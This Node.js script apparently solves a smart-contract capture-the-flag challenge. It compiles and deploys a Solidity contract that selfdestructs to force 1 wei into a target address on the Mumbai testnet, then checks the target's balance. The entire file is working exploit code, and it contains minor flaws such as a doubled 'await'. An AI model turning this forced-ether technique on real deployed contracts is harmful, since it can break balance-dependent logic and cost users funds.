const ethers = require('ethers');
const provider = new ethers.JsonRpcProvider('https://matic-mumbai.chainstacklabs.com');
const solc = require('solc');

const exploitContract = `
pragma solidity ^0.8.19;

contract Exploit {
    constructor(address _target) payable {
        selfdestruct(payable(_target));
    }
}
`;

const compilerInput = {
    language: 'Solidity',
    sources: {
        'Exploit.sol': {
            content: exploitContract,
        },
    },
    settings: {
        outputSelection: {
            '*': {
                '*': ['*'],
            },
        },
    },
};

async function solve(privateKey, contractAddress) {
    if (await isSolved(contractAddress)) {
        console.log('already solved');
        return;
    }

    console.log('compiling exploit...');
    const compiler = await await getSolc('v0.8.19+commit.7dd6d404');
    const output = JSON.parse(compiler.compile(JSON.stringify(compilerInput)));
    const exploitAbi = output.contracts['Exploit.sol'].Exploit.abi;
    const exploitBytecode = output.contracts['Exploit.sol'].Exploit.evm.bytecode.object;

    console.log('deploying exploit...');
    const wallet = new ethers.Wallet(privateKey, provider);
    const factory = new ethers.ContractFactory(exploitAbi, exploitBytecode, wallet);
    const exploitContract = await factory.deploy(contractAddress, {
        value: ethers.parseUnits('1', 'wei'),
    });

    console.log('exploit deployed at', await exploitContract.getAddress());
    console.log('checking contract balance...');
    if (await isSolved(contractAddress)) {
        console.log('solved!');
    } else {
        console.log('contract address is 0. Something went wrong.');
        process.exit(1);
    }
}

async function isSolved(contractAddress) {
    const balance = await provider.getBalance(contractAddress);
    return balance > ethers.parseEther('0');
}

async function getSolc(version) {
    return new Promise((resolve, reject) => {
        solc.loadRemoteVersion(version, (err, solc) => {
            if (err) {
                reject(err);
                return;
            }

            resolve(solc);
        });
    });
}

const privateKey = process.argv[2];
if (!privateKey) {
    console.error('private key must be provided as first argument');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('contract address must be provided as second argument');
    process.exit(1);
}

solve(privateKey, contractAddress);
